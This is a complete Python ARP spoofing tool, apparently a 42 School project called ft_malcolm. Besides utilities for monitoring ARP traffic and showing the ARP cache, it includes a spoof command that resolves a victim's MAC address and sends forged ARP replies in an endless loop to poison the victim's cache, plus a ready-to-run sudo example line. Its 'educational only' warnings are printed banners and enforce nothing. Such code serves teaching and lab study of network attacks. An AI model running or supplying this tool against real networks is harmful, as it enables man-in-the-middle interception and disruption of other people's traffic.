#!/usr/bin/env python3
"""
ft_malcolm - ARP Spoofing Tool (Educational)
42 School Project - Security Track

This tool demonstrates ARP protocol vulnerabilities for educational purposes.
Only use in controlled environments with proper authorization.
"""

import sys
import struct
import socket
import fcntl
import os
import time
import argparse
from typing import Tuple, Optional


# =============================================================================
# Constants
# =============================================================================

ETH_P_ALL = 0x0003
ETH_P_ARP = 0x0806
ARPOP_REQUEST = 1
ARPOP_REPLY = 2

# Ethernet header: 14 bytes
# ARP header: 28 bytes


# =============================================================================
# Utility Functions
# =============================================================================

def mac_str_to_bytes(mac: str) -> bytes:
    """Convert MAC address string to bytes."""
    parts = mac.replace('-', ':').split(':')
    if len(parts) != 6:
        raise ValueError(f"Invalid MAC address: {mac}")
    return bytes(int(p, 16) for p in parts)


def mac_bytes_to_str(mac: bytes) -> str:
    """Convert MAC bytes to string."""
    return ':'.join(f'{b:02x}' for b in mac)


def ip_str_to_bytes(ip: str) -> bytes:
    """Convert IP address string to bytes."""
    return socket.inet_aton(ip)


def ip_bytes_to_str(ip: bytes) -> bytes:
    """Convert IP bytes to string."""
    return socket.inet_ntoa(ip)


def get_interface_mac(interface: str) -> bytes:
    """Get MAC address of an interface."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  # SIOCGIFHWADDR
                          struct.pack('256s', interface[:15].encode()))
        s.close()
        return info[18:24]
    except Exception as e:
        raise RuntimeError(f"Cannot get MAC for {interface}: {e}")


def get_interface_ip(interface: str) -> bytes:
    """Get IP address of an interface."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8915,  # SIOCGIFADDR
                          struct.pack('256s', interface[:15].encode()))
        s.close()
        return info[20:24]
    except Exception as e:
        raise RuntimeError(f"Cannot get IP for {interface}: {e}")


# =============================================================================
# ARP Packet Builder
# =============================================================================

class ARPPacket:
    """ARP packet structure."""

    def __init__(self):
        self.hw_type = 1  # Ethernet
        self.proto_type = 0x0800  # IPv4
        self.hw_size = 6  # MAC length
        self.proto_size = 4  # IP length
        self.opcode = ARPOP_REPLY
        self.sender_mac = b'\x00' * 6
        self.sender_ip = b'\x00' * 4
        self.target_mac = b'\x00' * 6
        self.target_ip = b'\x00' * 4

    def build(self) -> bytes:
        """Build ARP packet."""
        return struct.pack(
            '!HHBBH',
            self.hw_type,
            self.proto_type,
            self.hw_size,
            self.proto_size,
            self.opcode
        ) + self.sender_mac + self.sender_ip + self.target_mac + self.target_ip

    @classmethod
    def parse(cls, data: bytes) -> 'ARPPacket':
        """Parse ARP packet from bytes."""
        if len(data) < 28:
            raise ValueError("ARP packet too short")

        pkt = cls()
        pkt.hw_type, pkt.proto_type, pkt.hw_size, pkt.proto_size, pkt.opcode = \
            struct.unpack('!HHBBH', data[:8])
        pkt.sender_mac = data[8:14]
        pkt.sender_ip = data[14:18]
        pkt.target_mac = data[18:24]
        pkt.target_ip = data[24:28]
        return pkt

    def __str__(self):
        op = "REQUEST" if self.opcode == ARPOP_REQUEST else "REPLY"
        return (f"ARP {op}: "
                f"{mac_bytes_to_str(self.sender_mac)} ({ip_bytes_to_str(self.sender_ip)}) -> "
                f"{mac_bytes_to_str(self.target_mac)} ({ip_bytes_to_str(self.target_ip)})")


class EthernetFrame:
    """Ethernet frame structure."""

    def __init__(self):
        self.dst_mac = b'\xff' * 6  # Broadcast by default
        self.src_mac = b'\x00' * 6
        self.ethertype = ETH_P_ARP
        self.payload = b''

    def build(self) -> bytes:
        """Build Ethernet frame."""
        return self.dst_mac + self.src_mac + struct.pack('!H', self.ethertype) + self.payload

    @classmethod
    def parse(cls, data: bytes) -> 'EthernetFrame':
        """Parse Ethernet frame from bytes."""
        if len(data) < 14:
            raise ValueError("Ethernet frame too short")

        frame = cls()
        frame.dst_mac = data[0:6]
        frame.src_mac = data[6:12]
        frame.ethertype = struct.unpack('!H', data[12:14])[0]
        frame.payload = data[14:]
        return frame


# =============================================================================
# ARP Operations
# =============================================================================

def create_arp_reply(src_mac: bytes, src_ip: bytes,
                     dst_mac: bytes, dst_ip: bytes) -> bytes:
    """Create an ARP reply packet."""
    arp = ARPPacket()
    arp.opcode = ARPOP_REPLY
    arp.sender_mac = src_mac
    arp.sender_ip = src_ip
    arp.target_mac = dst_mac
    arp.target_ip = dst_ip

    frame = EthernetFrame()
    frame.dst_mac = dst_mac
    frame.src_mac = src_mac
    frame.payload = arp.build()

    return frame.build()


def create_arp_request(src_mac: bytes, src_ip: bytes, target_ip: bytes) -> bytes:
    """Create an ARP request packet."""
    arp = ARPPacket()
    arp.opcode = ARPOP_REQUEST
    arp.sender_mac = src_mac
    arp.sender_ip = src_ip
    arp.target_mac = b'\x00' * 6
    arp.target_ip = target_ip

    frame = EthernetFrame()
    frame.dst_mac = b'\xff' * 6  # Broadcast
    frame.src_mac = src_mac
    frame.payload = arp.build()

    return frame.build()


# =============================================================================
# ARP Monitor
# =============================================================================

def monitor_arp(interface: str, count: int = 0, verbose: bool = False):
    """Monitor ARP traffic on an interface."""
    print(f"[*] Monitoring ARP traffic on {interface}")
    print("[*] Press Ctrl+C to stop\n")

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
        sock.bind((interface, 0))
    except PermissionError:
        print("[!] Error: Root privileges required")
        return
    except Exception as e:
        print(f"[!] Error: {e}")
        return

    received = 0
    try:
        while count == 0 or received < count:
            data = sock.recv(65535)
            frame = EthernetFrame.parse(data)

            if frame.ethertype == ETH_P_ARP:
                arp = ARPPacket.parse(frame.payload)
                received += 1

                op = "REQUEST" if arp.opcode == ARPOP_REQUEST else "REPLY"
                sender_mac = mac_bytes_to_str(arp.sender_mac)
                sender_ip = ip_bytes_to_str(arp.sender_ip)
                target_mac = mac_bytes_to_str(arp.target_mac)
                target_ip = ip_bytes_to_str(arp.target_ip)

                if arp.opcode == ARPOP_REQUEST:
                    print(f"[ARP {op}] Who has {target_ip}? Tell {sender_ip} ({sender_mac})")
                else:
                    print(f"[ARP {op}] {sender_ip} is at {sender_mac}")

                if verbose:
                    print(f"    Src MAC: {mac_bytes_to_str(frame.src_mac)}")
                    print(f"    Dst MAC: {mac_bytes_to_str(frame.dst_mac)}")

    except KeyboardInterrupt:
        print(f"\n[*] Captured {received} ARP packets")
    finally:
        sock.close()


# =============================================================================
# ARP Spoof (Educational Demo)
# =============================================================================

def spoof_arp(interface: str, target_ip: str, spoof_ip: str,
              target_mac: str = None, interval: float = 1.0):
    """
    Send spoofed ARP replies (EDUCATIONAL USE ONLY).

    This function demonstrates the ARP spoofing technique for learning purposes.
    Only use in controlled environments with proper authorization.
    """
    print("[!] WARNING: This tool is for educational purposes only!")
    print("[!] Only use in authorized environments (e.g., your own lab)")
    print()

    try:
        my_mac = get_interface_mac(interface)
    except Exception as e:
        print(f"[!] Error getting interface MAC: {e}")
        return

    print(f"[*] Interface: {interface}")
    print(f"[*] Our MAC: {mac_bytes_to_str(my_mac)}")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Spoofing as: {spoof_ip}")
    print()

    # If target MAC not provided, we need to discover it
    if not target_mac:
        print(f"[*] Resolving MAC for {target_ip}...")
        target_mac_bytes = resolve_mac(interface, target_ip, my_mac)
        if not target_mac_bytes:
            print(f"[!] Could not resolve MAC for {target_ip}")
            return
        print(f"[*] Target MAC: {mac_bytes_to_str(target_mac_bytes)}")
    else:
        target_mac_bytes = mac_str_to_bytes(target_mac)

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
        sock.bind((interface, 0))
    except PermissionError:
        print("[!] Error: Root privileges required")
        return

    # Build spoofed ARP reply
    # "spoof_ip is at my_mac" -> sent to target
    packet = create_arp_reply(
        my_mac,
        ip_str_to_bytes(spoof_ip),
        target_mac_bytes,
        ip_str_to_bytes(target_ip)
    )

    print(f"[*] Sending spoofed ARP replies every {interval}s...")
    print("[*] Press Ctrl+C to stop")

    count = 0
    try:
        while True:
            sock.send(packet)
            count += 1
            print(f"\r[*] Sent {count} packets", end='', flush=True)
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[*] Stopped. Sent {count} packets total.")
    finally:
        sock.close()


def resolve_mac(interface: str, target_ip: str, src_mac: bytes,
                timeout: float = 2.0) -> Optional[bytes]:
    """Resolve MAC address for an IP using ARP."""
    try:
        src_ip = get_interface_ip(interface)
    except:
        src_ip = b'\x00\x00\x00\x00'

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    sock.bind((interface, 0))
    sock.settimeout(timeout)

    # Send ARP request
    request = create_arp_request(src_mac, src_ip, ip_str_to_bytes(target_ip))
    sock.send(request)

    # Wait for reply
    start = time.time()
    while time.time() - start < timeout:
        try:
            data = sock.recv(65535)
            frame = EthernetFrame.parse(data)
            if frame.ethertype == ETH_P_ARP:
                arp = ARPPacket.parse(frame.payload)
                if arp.opcode == ARPOP_REPLY and \
                   ip_bytes_to_str(arp.sender_ip) == target_ip:
                    sock.close()
                    return arp.sender_mac
        except socket.timeout:
            break

    sock.close()
    return None


# =============================================================================
# ARP Table Display
# =============================================================================

def show_arp_table():
    """Display system ARP table."""
    print("ARP Cache:")
    print("-" * 60)
    try:
        with open('/proc/net/arp', 'r') as f:
            lines = f.readlines()
            print(f"{'IP Address':<20} {'HW Address':<20} {'Device':<10}")
            print("-" * 60)
            for line in lines[1:]:  # Skip header
                parts = line.split()
                if len(parts) >= 6:
                    ip = parts[0]
                    mac = parts[3]
                    dev = parts[5]
                    if mac != '00:00:00:00:00:00':
                        print(f"{ip:<20} {mac:<20} {dev:<10}")
    except Exception as e:
        print(f"Error reading ARP table: {e}")


# =============================================================================
# Main
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="ft_malcolm - ARP Tool (Educational)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Monitor ARP traffic
  sudo python ft_malcolm.py monitor -i eth0

  # Show ARP table
  python ft_malcolm.py table

  # Resolve MAC address
  sudo python ft_malcolm.py resolve -i eth0 -t 192.168.1.1

  # ARP spoof (EDUCATIONAL - authorized use only)
  sudo python ft_malcolm.py spoof -i eth0 -t 192.168.1.10 -s 192.168.1.1

WARNING: The spoof function is for educational purposes only.
Only use in controlled environments with proper authorization.
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='Command')

    # Monitor command
    mon = subparsers.add_parser('monitor', help='Monitor ARP traffic')
    mon.add_argument('-i', '--interface', required=True, help='Network interface')
    mon.add_argument('-c', '--count', type=int, default=0, help='Number of packets (0=infinite)')
    mon.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # Table command
    subparsers.add_parser('table', help='Show ARP table')

    # Resolve command
    res = subparsers.add_parser('resolve', help='Resolve MAC address')
    res.add_argument('-i', '--interface', required=True, help='Network interface')
    res.add_argument('-t', '--target', required=True, help='Target IP')

    # Spoof command
    spf = subparsers.add_parser('spoof', help='ARP spoof (educational)')
    spf.add_argument('-i', '--interface', required=True, help='Network interface')
    spf.add_argument('-t', '--target', required=True, help='Target IP')
    spf.add_argument('-s', '--spoof', required=True, help='IP to spoof as')
    spf.add_argument('-m', '--mac', help='Target MAC (auto-resolve if not provided)')
    spf.add_argument('--interval', type=float, default=1.0, help='Packet interval (seconds)')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    print("ft_malcolm - ARP Tool")
    print("=" * 50)

    if args.command == 'monitor':
        monitor_arp(args.interface, args.count, args.verbose)

    elif args.command == 'table':
        show_arp_table()

    elif args.command == 'resolve':
        try:
            my_mac = get_interface_mac(args.interface)
            mac = resolve_mac(args.interface, args.target, my_mac)
            if mac:
                print(f"{args.target} is at {mac_bytes_to_str(mac)}")
            else:
                print(f"Could not resolve {args.target}")
        except Exception as e:
            print(f"Error: {e}")

    elif args.command == 'spoof':
        spoof_arp(args.interface, args.target, args.spoof, args.mac, args.interval)


if __name__ == "__main__":
    main()
